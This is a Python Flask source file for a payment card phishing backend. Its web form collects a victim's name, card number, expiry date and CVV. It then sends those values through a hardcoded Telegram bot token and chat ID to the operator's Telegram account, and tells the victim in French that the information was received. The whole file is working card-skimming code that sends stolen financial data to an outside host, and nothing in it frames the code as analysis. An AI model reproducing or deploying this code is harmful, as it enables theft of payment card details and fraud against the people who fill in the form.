from flask import Flask, render_template, request
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = '7804154130:AAHKkrh1XZ0q2f4ULqL6WVwc0_E2jbYQD9E'
CHAT_ID = '5694913930'

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        name = request.form.get('name')
        cardnumber = request.form.get('cardnumber')
        expiry = request.form.get('expiry')
        cvv = request.form.get('cvv')

        message = f"""
        [💳 Nouvelle soumission]
        - Nom : {name}
        - Numéro : {cardnumber}
        - Expiration : {expiry}
        - CVV : {cvv}
        """

        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        data = {'chat_id': CHAT_ID, 'text': message}
        requests.post(url, data=data)

        return "Merci ! Vos informations ont été reçues."

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
